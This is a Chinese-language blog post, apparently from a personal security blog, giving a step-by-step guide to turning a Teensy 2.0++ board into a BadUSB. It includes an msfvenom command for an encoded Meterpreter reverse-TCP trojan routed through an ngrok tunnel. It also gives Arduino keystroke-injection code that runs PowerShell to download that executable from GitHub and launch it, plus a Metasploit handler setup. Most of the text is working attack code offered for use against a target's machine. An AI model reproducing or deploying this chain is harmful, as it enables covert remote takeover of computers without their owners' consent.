---
title: 渗透利器-Teensy（低配版BadUSB）
date: 2018-09-25 
tags: kali
layut: post
---

### 准备工作
* 一块 **Teensy2.0++** 的板子(淘宝一搜就有)
* Arduino编译器
    - 1.8.7版本下载连接：[arduino下载地址](https://downloads.arduino.cc/arduino-1.8.7-linux64.tar.xz "arduino") 
* Teensy插件
    - 下载连接：[Teensy下载地址](https://www.pjrc.com/teensy/td_144/TeensyduinoInstall.linux64 "Teensy")
    
![1](http://da1sy.github.io/assets/images/9-Yue/teensy-1.jpg)

### 1.下载好arduino后直接解压
```linux
⚡ /home/da1sy/arduino-1.8.7# ./arduino
```
### 2.安装Teensy插件
```
⚡ /home/da1sy/arduino-1.8.7# ./TeensyduinoInstall.linux64
```
**注意将插件安装到arduino的解压目录下**
### 3.arduino修改配置
打开软件后将 **工具** 下配置修改如下
![2](http://da1sy.github.io/assets/images/9-Yue/teensy-2.jpg)

### 4.利用ngrok实现内网穿透
#### 在https://www.ngrok.cc/ 注册账号后开通tcp隧道
![3](http://da1sy.github.io/assets/images/9-Yue/teensy-3.png)
#### 下载客户端
```linux
⚡/home/da1sy/桌面/linux_amd64# ./sunny clientid 隧道ID号
```
![4](http://da1sy.github.io/assets/images/9-Yue/teensy-4.png)
### 5.利用msfvenom生成windows端木马
```linux
 ⚡/home/da1sy# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 12 -b '\x00' lhost=free.idcfengye.com lport=17839 -f exe > windows.exe  
```
**lhost** 为运行sunny后的域名，**lport**为开通隧道时填写的端口（运行后也会有显示）
#### **最后将生成的木马放到github项目上实现远程下载**
### 6.编辑arduino代码
```arduino
char *command1 = "powershell -Command $clnt = new-object System.Net.WebClient;$url= 'https://raw.githubusercontent.com/da1sy/da1sy/master/windows.exe';$file = ' %HOMEPATH%\\windows.exe ';$clnt.DownloadFile($url,$file); ";
char *command2 = "%HOMEPATH%\\windows.exe ";
//将连接的地址改为自己github的地址
void setup() { 
    delay(5000);
    omg(command1);
    delay(15000);
    omg(command2);
 }
  
void loop() {}

void omg(char *SomeCommand)
{
  Keyboard.set_modifier(128); 
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now(); 
  Keyboard.set_modifier(0); 
  Keyboard.set_key1(0); 
  Keyboard.send_now(); 
  delay(1500);
  Keyboard.println(SomeCommand);
}
```
#### 编辑好后点**验证**，然后插入**Teensy**板子，最后按一下板子上的按钮完成上传

### 7.metasploit开启监听
```
⚡ /home/da1sy/# msfconsole

msf > use exploit/multi/handler
msf exploit(multi/handler) > set lhost 127.0.0.1   
msf exploit(multi/handler) > set lport 6666        //ngrok开通隧道时填写的本地地址与端口号
msf exploit(multi/handler) > exploit
```
![5](http://da1sy.github.io/assets/images/9-Yue/teensy-5.png)

### 8.最后对目标插入badusb
效果图如下
![6](http://da1sy.github.io/assets/images/9-Yue/teensy-s1.gif)

监听端
![7](http://da1sy.github.io/assets/images/9-Yue/teensy-s2.gif)

> 最后反弹的会话好像是出现了毛病，不过总体上嘛 问题不大

### 一些其他的代码
```
有时间再补
```
